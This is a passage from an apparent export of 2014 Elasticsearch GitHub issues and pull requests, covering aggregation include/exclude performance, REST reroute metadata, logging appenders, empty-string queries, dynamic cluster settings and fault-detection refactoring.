In these scenarios a previous query for a topic ("mafia" or "LJM") may have selected the main entities of interest (using a _terms_ or _significant_terms_ agg) and these IDs are then used in a subsequent query like the one below to produce the edges in our graph:

```
        "aggs" : {
                        "actor":{
                            "terms":{"field":"actorName",  "size":500,
                                "include": ["Robert DeNiro", "Joe Pesci", "Al Pacino"...]
                            },
                            "aggs":{
                                    "costar":{
                                        "terms":{"field":"actorName",  "size":500,
                                                    "include": ["Robert DeNiro", "Joe Pesci", "Al Pacino"...]
                                        }
                                        }
                                }                            
                            }
        }
```

Each leaf bucket is then an edge in our graph with a count of number of interactions between a pair of actors and the potential for further child aggs (date histograms summarising relationship over time etc).

This is a little clumsy and we could create a special "graph" agg for this use case as it would overcome these concerns:
1) the need to declare 2 aggs clauses repeating the same list of "includes"
2) the default removal of "self-connecting" edges i.e. a DeNiro-&gt;DeNiro bucket

I'm not sure what the other use cases are that require these include clauses but this feels like a broad one deserving of its own agg.

For the general case I like your suggestion of taking the terms in my include set and looking up just their global ordinals as an alternative to looking up ALL terms. Would you suggest we always adopt this approach for non-regex IncludeExcludes?
</comment><comment author="martijnvg" created="2014-09-09T12:53:07Z" id="54963974">&gt; Would you suggest we always adopt this approach for non-regex IncludeExcludes?

Yes, this will improve non-regex includes/excludes a lot and this should be a trivial change.
</comment><comment author="markharwood" created="2014-09-09T12:55:25Z" id="54964219">I made the change - what was a 74 seconds lookup is now only 153 milliseconds on my dataset
</comment><comment author="markharwood" created="2014-09-09T14:15:19Z" id="54974985">Blocked pending a review for the required non-regex support in https://github.com/elasticsearch/elasticsearch/pull/7529 
</comment><comment author="markharwood" created="2014-09-12T15:29:21Z" id="55419155">For simpler cases where exact terms are passed in include/exclude clauses (a feature enabled in this addition: https://github.com/elasticsearch/elasticsearch/pull/7529 ) performance is radically improved.

However it is acknowledged that performance is still bad for a pure regex-based filter on high cardinality fields (we deliberately chose a slow response over the possibility of running out of RAM). @jpountz  has suggested we could look at using some of Lucene's automaton features to efficiently filter termsenums. For that reason I have labeled this issue as "high hanging fruit" to recognise the remaining work that may need doing to make regex-based filters faster
</comment><comment author="jpountz" created="2014-11-07T10:46:02Z" id="62126255">We talked about intersecting the field data terms dictionary with automatons to speed up the generation of the bit set of matching terms. This would be a breaking change in 2.0 as we would switch from Java's regular expressions to Lucene's which have a slightly different syntax.

Another change might be required: in some cases evaluating whether a term matches the regular expression at search time can be faster than doing it ahead of time like we do today.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update plugins.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7525</link><project id="" key="" /><description>add search by sql
</description><key id="41591776">7525</key><summary>Update plugins.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">ansjsun</reporter><labels><label>docs</label></labels><created>2014-08-31T17:44:15Z</created><updated>2014-09-09T12:58:10Z</updated><resolved>2014-09-09T12:58:10Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T14:14:03Z" id="54713338">Hi @ansjsun 

Thanks for the PR. Please could I ask you to sign our CLA so that I can merge it in.
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="ansjsun" created="2014-09-09T05:33:21Z" id="54926121">i had agreement http://www.elasticsearch.org/contributor-agreement/  now  can you  merge it ? 
</comment><comment author="clintongormley" created="2014-09-09T12:57:56Z" id="54964502">thanks @ansjsun - merged
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add the cluster name to the "/" endpoint</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7524</link><project id="" key="" /><description>The root endpoint returns basic information about this node, like it's name and ES version etc. The cluster name is an important information that belongs in that list.
</description><key id="41584873">7524</key><summary>Add the cluster name to the "/" endpoint</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:REST</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-31T12:07:58Z</created><updated>2015-06-07T12:09:23Z</updated><resolved>2014-09-01T08:06:17Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-09-01T07:48:55Z" id="54030797">LGTM, useful tiny little piece!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Reroute API response didn't filter metadata</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7523</link><project id="" key="" /><description>By default the reroute API should return the new cluster state, excluding the metadata. It was however it was wrongly using an old parameter (filter_metadata) and thus failed to do so. This commits restores but wiring it to the correct `metric` parameter.

Closes #7520 

PS. The name `metric` for filtering cluster state feels wrong, but this remains for another change (and a discussion)
</description><key id="41570641">7523</key><summary>Reroute API response didn't filter metadata</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:REST</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-30T20:02:11Z</created><updated>2015-06-07T18:50:55Z</updated><resolved>2014-09-10T12:48:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-01T14:19:24Z" id="54064970">can we add constants to the metrics, so such a problem won't happen again?
</comment><comment author="s1monw" created="2014-09-10T07:54:25Z" id="55082365">@bleskes I agree with @kimchy can we add constants here? other than that LGTM
</comment><comment author="s1monw" created="2014-09-10T12:26:29Z" id="55107497">LGTM
</comment><comment author="bleskes" created="2014-09-10T12:32:36Z" id="55108087">@s1monw @kimchy I pushed another commit with an Enum for the metrics.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Test: Unify the randomization logic for number of shards and replicas</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7522</link><project id="" key="" /><description>We currently have two ways to randomize the number of shards and replicas: random index template, that stays the same for all indices created under the same scope, and the overridable `indexSettings` method, called by `createIndex` and `prepareCreate` which uses a different value for each new index.

Now that the `randomIndexTemplate` method is not static anymore, we can easily apply the same logic in both cases. Especially for number of replicas, we used to have slightly different behaviours, where more than one replicas were only rarely used through random index template, which gets now applied to the `indexSettings` method too (might speed up the tests a bit).

Side note: `randomIndexTemplate` had its own logic which didn't depend on `numberOfReplicas` or `maximumNumberOfReplicas`, which was causing bw comp tests failures since in some cases too many copies of the data are requested, which cannot be allocated to older nodes, and the write consistency quorum cannot be met, thus indexing times out.
</description><key id="41565615">7522</key><summary>Test: Unify the randomization logic for number of shards and replicas</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-30T15:37:04Z</created><updated>2015-06-07T11:46:37Z</updated><resolved>2014-09-01T10:04:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-31T13:30:27Z" id="53987954">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>jar for version 1.3.2 broken in maven repository</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7521</link><project id="" key="" /><description>HI

Please check the jar  in the maven repository for version 1.3.2: it gives me problems while compiling, as the Client class seems to be broken. After some experiment, I've managed to have the code work again by substitute the jar dowloaded from maven central with the jar in the /lib directory of a brand new elasticsearch 1.3.2 installation.
</description><key id="41550814">7521</key><summary>jar for version 1.3.2 broken in maven repository</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">seralf</reporter><labels><label>feedback_needed</label></labels><created>2014-08-30T00:54:15Z</created><updated>2014-09-06T14:18:50Z</updated><resolved>2014-09-06T14:18:50Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-09-01T08:03:01Z" id="54031834">Hey,

I just created a mini maven project with ES 1.3.2 as dependency and was able to fire up a node and use a client. Can you share your code, so we can reproduce your problem?
</comment><comment author="seralf" created="2014-09-01T10:02:55Z" id="54042182">Hi it simply used the maven dependency and instantiate the client with the
usual syntax (the same on the site): after updating to version 1.3.2
compiler gives me problems, so I found that the compiled class in the
artifact from maven has some problems. I repeat the test two-three times to
be sure it was not only an error while dowloading... if now works I have no
idea of what can be happened. Is it possible that the artifact was
automatically rebuild from the same version?

2014-09-01 10:03 GMT+02:00 Alexander Reelsen notifications@github.com:

&gt; Hey,
&gt; 
&gt; I just created a mini maven project with ES 1.3.2 as dependency and was
&gt; able to fire up a node and use a client. Can you share your code, so we can
&gt; reproduce your problem?
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/elasticsearch/elasticsearch/issues/7521#issuecomment-54031834
&gt; .
</comment><comment author="clintongormley" created="2014-09-06T14:18:50Z" id="54713479">We certainly wouldn't have replaced an existing file with a newer one, using the same version.  Glad you managed to get it working.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>REST Reroute request should not return metadata by default</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7520</link><project id="" key="" /><description>The REST endpoint tries to filter the metadata, but uses the wrong constant for it, it uses `filter_metadata` instead of `metadata`.
</description><key id="41549178">7520</key><summary>REST Reroute request should not return metadata by default</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels /><created>2014-08-30T00:00:11Z</created><updated>2014-09-10T12:48:51Z</updated><resolved>2014-09-10T12:48:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Fixing double reference to `index.search.` in slowlog documentation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7519</link><project id="" key="" /><description /><key id="41533307">7519</key><summary>Fixing double reference to `index.search.` in slowlog documentation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">divideby0</reporter><labels /><created>2014-08-29T19:41:42Z</created><updated>2014-09-01T09:55:00Z</updated><resolved>2014-09-01T09:55:00Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-09-01T09:55:00Z" id="54041508">@divideby0 thx for looking at this, but this not a double reference to index.search. Rather one of the settings refers to the query phase and the other fetch phase.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[Tests] add different node name prefix for the different cluster type</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7518</link><project id="" key="" /><description>During a test run we have a global shared cluster and potentially a suite level or even a test level cluster running. All of those share the same node name pattern (node_#). This can be confusing if you're debugging discovery related tests where those nodes from the different clusters potentially interact (and reject each other). This commit gives each cluster type a unique prefix to make tracing and log filtering simpler.
</description><key id="41532550">7518</key><summary>[Tests] add different node name prefix for the different cluster type</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>test</label></labels><created>2014-08-29T19:31:08Z</created><updated>2014-10-21T21:41:06Z</updated><resolved>2014-08-29T19:35:25Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-29T19:32:23Z" id="53920457">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Use org.apache.log4j.RollingFileAppender as the default appender for ES logs?</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7517</link><project id="" key="" /><description>We currently use org.apache.log4j.DailyRollingFileAppender for the default appender for the main ES log and slowlogs.  DailyRollingFileAppender keeps creating files and has no limit on the # of files created.  

Seems like it will benefit admins if we implement the default logging appenders to use **rollingFile** (org.apache.log4j.RollingFileAppender) with sensible defaults for **MaxBackupIndex** and **MaxBackupIndex** parameters (so that there is a cap on the # and size of log files created). And admins can adjust them based on their preference.

Or if we desire daily logs, use a custom DRFA with MaxBackupIndex option?
http://wiki.apache.org/logging-log4j/DailyRollingFileAppender
</description><key id="41529228">7517</key><summary>Use org.apache.log4j.RollingFileAppender as the default appender for ES logs?</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ppf2</reporter><labels><label>discuss</label></labels><created>2014-08-29T18:49:29Z</created><updated>2014-11-07T10:46:28Z</updated><resolved>2014-11-07T10:46:28Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="Erni" created="2014-09-18T09:12:28Z" id="56013831">We are currently changing to rollingFileAppender. We use AWS M3 instance types (ssd storage), where disk space is quite valuable. They are good disks not meant for storing huge data but for the IO disk operations, which is what Lucene needs.
We have a cluster with several nodes, and it&#180;s not good a good practice to go node by node deleting log files every time we have low disk space just because of the log files (not because of the index data). Also, as a good practice, we have to make sure that running out of space (due to log files) is not going to happen. So yes, we need that **MaxBackupIndex** available.
</comment><comment author="colings86" created="2014-11-07T10:46:28Z" id="62126290">We don't plan to change the default appender used in Elasticsearch. However we are planning to add log4j-extras so it is available 'out of the box' to use in the server in #7927 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update cardinality-aggregation.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7516</link><project id="" key="" /><description /><key id="41522120">7516</key><summary>Update cardinality-aggregation.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">shrinidhichaudhari</reporter><labels><label>docs</label></labels><created>2014-08-29T17:24:41Z</created><updated>2014-09-06T18:46:19Z</updated><resolved>2014-09-06T18:46:19Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T14:06:50Z" id="54713165">Hi @shrinidhichaudhari 

Thanks for the fix. Please could I ask you to sign the CLA so that I can get it merged in.
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="shrinidhichaudhari" created="2014-09-06T16:20:46Z" id="54717046">Done!

On Sat, Sep 6, 2014 at 7:37 PM, Clinton Gormley notifications@github.com
wrote:

&gt; Hi @shrinidhichaudhari https://github.com/shrinidhichaudhari
&gt; 
&gt; Thanks for the fix. Please could I ask you to sign the CLA so that I can
&gt; get it merged in.
&gt; http://www.elasticsearch.org/contributor-agreement/
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/elasticsearch/elasticsearch/pull/7516#issuecomment-54713165
&gt; .

## 

Shrinidhi Chaudhari_._
</comment><comment author="clintongormley" created="2014-09-06T18:46:14Z" id="54724219">thanks @shrinidhichaudhari - merged!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Finding documents with empty string as value</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7515</link><project id="" key="" /><description>Hello, 

I've been trying to find all documents that contains a field with an empty string value (`_textContent`) inside my index using the `missing` filter. But I think that this filter doesn't treat empty strings as a null value.

Is this a bug, or the intended behavior for this filter? If it is like this by design, may I suggest adding an `empty` filter, if that's even possible?

As a plus, I'll post the mapping that I'm currently using, the document that contains the empty string field and the query that I'm trying to run:

Mapping:

``` json
{
  "documents": {
    "mappings": {
      "document": {
        "properties": {
          "_contratante": {
            "type": "string"
          },
          "_dateFields": {
            "type": "nested",
            "properties": {
              "id": {
                "type": "string",
                "index": "not_analyzed"
              },
              "value": {
                "type": "date",
                "format": "dateOptionalTime"
              }
            }
          },
          "_indexadoPor": {
            "type": "string"
          },
          "_textContent": {
            "type": "string"
          },
          "_textFields": {
            "type": "nested",
            "properties": {
              "id": {
                "type": "string",
                "index": "not_analyzed"
              },
              "value": {
                "type": "string"
              }
            }
          },
          "_tipoDocumento": {
            "type": "string"
          }
        }
      }
    }
  }
}
```

Document:

``` json
{
  "_index": "documents",
  "_type": "document",
  "_id": "xxx",
  "_version": 1,
  "found": true,
  "_source": {
    "_id": "xxx",
    "_contratante": "xxx",
    "_tipoDocumento": "xxx",
    "_indexadoPor": "xxx",
    "_dateFields": [
      {
        "id": "538730ece4b0d13600208d7a:2",
        "value": 1404183600000
      }
    ],
    "_textFields": [
      {
        "id": "538730ece4b0d13600208d7a:0",
        "value": "xxx"
      },
      {
        "id": "538730ece4b0d13600208d7a:1",
        "value": "xxx"
      },
      {
        "id": "538730ece4b0d13600208d7a:3",
        "value": ""
      },
      {
        "id": "538730ece4b0d13600208d7a:4",
        "value": "xxxx"
      }
    ],
    "_textContent": ""
  }
}
```

Query:

``` json
{
  "query": {
    "filtered": {
      "filter": {
        "missing": {
          "field": "_textContent"
        }
      }
    }
  }
}
```

Thanks a lot for the amazing tool developed here!
</description><key id="41518985">7515</key><summary>Finding documents with empty string as value</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">paulovictorv</reporter><labels /><created>2014-08-29T16:45:14Z</created><updated>2015-11-21T18:16:23Z</updated><resolved>2015-11-21T18:16:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="hxuanji" created="2014-09-01T03:30:03Z" id="54012342">Hi Paulo and everyone,

I just ran a few tests and also have same questions about it. 
The situation can be produced by the gist: https://gist.github.com/hxuanji/d941c21fc75648ce7ba4

On the ES 1.3.2, the empty string cannot be find and the gist above can only find one document `{"name": null}`. And its explanation is 
`ConstantScore(cache(NotFilter(cache(BooleanFilter(_field_names:name)))))`

But on the ES 1.0.1, the final result of the gist can both find the empty-string and null-value documents. Also its explanation is 
`ConstantScore(cache(NotFilter(cache(BooleanFilter(name:[* TO *])))))`.

It seems the parsing rule changed, `_field_names` seems not consider some special null cases on the ES 1.3.2 ?! 
And this `_field_names` added from  #5659.

Any ideas?
</comment><comment author="jpountz" created="2014-09-01T06:40:16Z" id="54023841">I think this is a duplicate of https://github.com/elasticsearch/elasticsearch/issues/7348 ?
</comment><comment author="hxuanji" created="2014-09-01T08:23:34Z" id="54033271">Hi @jprante,

Yes, I think so.
</comment><comment author="paulovictorv" created="2014-09-01T13:39:03Z" id="54059855">Does adding an `empty` filter sounds silly? I think there's some good use cases for this.
</comment><comment author="clintongormley" created="2015-11-21T18:16:23Z" id="158668403">Here's a workaround:

```
PUT t/t/1
{
  "textContent": ""
}

PUT t/t/2
{
  "textContent": "foo"
}

GET t/t/_search
{
  "query": {
    "bool": {
      "must": [
        {
          "exists": {
            "field": "textContent"
          }
        }
      ],
      "must_not": [
        {
          "wildcard": {
            "textContent": "*"
          }
        }
      ]
    }
  }
}
```

Not optimal, but it works
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>The nested aggregator should iterate over the child doc ids in ascending order.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7514</link><project id="" key="" /><description>PR for #7505
</description><key id="41513590">7514</key><summary>The nested aggregator should iterate over the child doc ids in ascending order.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">martijnvg</reporter><labels><label>:Aggregations</label><label>:Nested Docs</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-29T15:45:27Z</created><updated>2015-06-07T18:51:14Z</updated><resolved>2014-08-29T21:11:11Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-29T16:01:41Z" id="53895523">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>action.auto_create_index isn't a dynamic setting</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7513</link><project id="" key="" /><description>Looks like `action.auto_create_index` can't be set dynamically as it isn't listed in ClusterDynamicSettingsModule.java.  Any objection to me adding it?
</description><key id="41512397">7513</key><summary>action.auto_create_index isn't a dynamic setting</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">nik9000</reporter><labels><label>:Settings</label><label>adoptme</label><label>enhancement</label><label>low hanging fruit</label></labels><created>2014-08-29T15:32:52Z</created><updated>2016-09-01T10:39:57Z</updated><resolved>2016-09-01T10:39:57Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T14:05:41Z" id="54713130">Hmm - not sure this should be a dynamic setting...
</comment><comment author="clintongormley" created="2014-09-06T14:06:03Z" id="54713141">@javanna any thoughts on this?
</comment><comment author="javanna" created="2014-09-09T12:13:15Z" id="54959969">not sure either, it currently is a node level static setting, we could make it a cluster dynamic setting, but I think the rationale behind this choice was that one should not be able to change it dynamically. I'm conflicted here :)
</comment><comment author="clintongormley" created="2014-09-09T13:01:13Z" id="54964879">@javanna my thinking exactly :)

Anybody else disagree? otherwise i think we should close this
</comment><comment author="nik9000" created="2014-09-09T14:06:48Z" id="54973719">My reasoning for wanting it is that I tend to use it to prevent accidental index creation.  My requirements changed slightly in that I have change it from a `false` to a whitelist pattern but if I can't change the pattern on the fly I have to schedule the change to go with the next rolling restart.
</comment><comment author="clintongormley" created="2014-09-09T14:23:35Z" id="54976283">I wasn't aware that you _could_ specify a pattern!  This makes me lean more towards making it dynamic.  
</comment><comment author="bleskes" created="2014-09-14T14:58:36Z" id="55528190">IMHO this should be dynamic. In my opinion this more of an error prevention feature than a security measure. We should opt for conveniance here for the operator. If you can call this end point you can create havoc anyway so i don't think we this plays as an argument here.

On Tue, Sep 9, 2014 at 4:23 PM, Clinton Gormley notifications@github.com
wrote:

&gt; ## I wasn't aware that you _could_ specify a pattern!  This makes me lean more towards making it dynamic.  
&gt; 
&gt; Reply to this email directly or view it on GitHub:
&gt; https://github.com/elasticsearch/elasticsearch/issues/7513#issuecomment-54976283
</comment><comment author="synhershko" created="2015-03-29T11:00:41Z" id="87392802">+1 for making this dynamic, at least if its on the pattern mode (and not just `false`)
</comment><comment author="pmusa" created="2016-02-08T17:32:08Z" id="181489172">+1 for that as a dynamic setting. I am trying to set it in found and it is not possible currently.
</comment><comment author="djschny" created="2016-06-05T12:45:06Z" id="223811138">+1 for this, it also helps avoid node level configuration inconsistency.
</comment><comment author="frivoire" created="2016-07-12T09:29:15Z" id="231986687">(I'm fairly new to the ES world but) this setting seems more like a cluster-wide dynamic setting to me.
</comment><comment author="itplayer" created="2016-08-31T02:32:05Z" id="243641165">I hope this setting can be a cluster-wide setting.
The reason is, if a node client setting is true(or lack of setting), but other nodes in cluster is false, then unexpected result happen.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Extract a common base class for (Master|Nodes)FaultDetection</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7512</link><project id="" key="" /><description>They share a lot of settings and logic

Note: this pr is against the feature/improve_zen branch and is part of the review process of #7493
</description><key id="41511650">7512</key><summary>Extract a common base class for (Master|Nodes)FaultDetection</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-29T15:25:49Z</created><updated>2015-06-07T12:09:42Z</updated><resolved>2014-09-01T13:55:40Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-29T15:35:59Z" id="53892164">LGTM
</comment><comment author="s1monw" created="2014-09-01T12:52:44Z" id="54055703">left minor comments other than that LGTM
</comment><comment author="bleskes" created="2014-09-01T13:55:40Z" id="54061370">thx simon. Pushed this into improve_zen.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Refactored ClusterStateUpdateTask protection against execution on a non master</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7511</link><project id="" key="" /><description>Previous implementation used a marker interface and had no explicit failure call back for the case update task was run on a non master (i.e., the master stepped down after it was submitted). That lead to a couple of instance of checks.

This approach moves ClusterStateUpdateTask from an interface to an abstract class, which allows adding a flag to indicate whether it should only run on master nodes (defaults to true). It also adds an explicit onNoLongerMaster call back to allow different error handling for that case. This also removed the need for the  NoLongerMaster.

Note: this pr is agains the feature/improve_zen branch , as part of the review process of #7493
</description><key id="41510393">7511</key><summary>Refactored ClusterStateUpdateTask protection against execution on a non master</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Cluster</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-29T15:13:03Z</created><updated>2015-06-07T12:09:52Z</updated><resolved>2014-09-01T13:58:52Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-29T15:33:40Z" id="53891863">LGTM
</comment><comment author="s1monw" created="2014-09-01T12:50:35Z" id="54055524">left some minor comments but I like this a lot!
</comment><comment author="bleskes" created="2014-09-01T13:58:52Z" id="54061677">Thx simon. pushed to 34f4ca763c5bb16b4fa9fb0b657b89971003fb74
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Geo: [TEST] Adds tests for GeoUtils</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7510</link><project id="" key="" /><description>Also added unit tests for GeoUtils
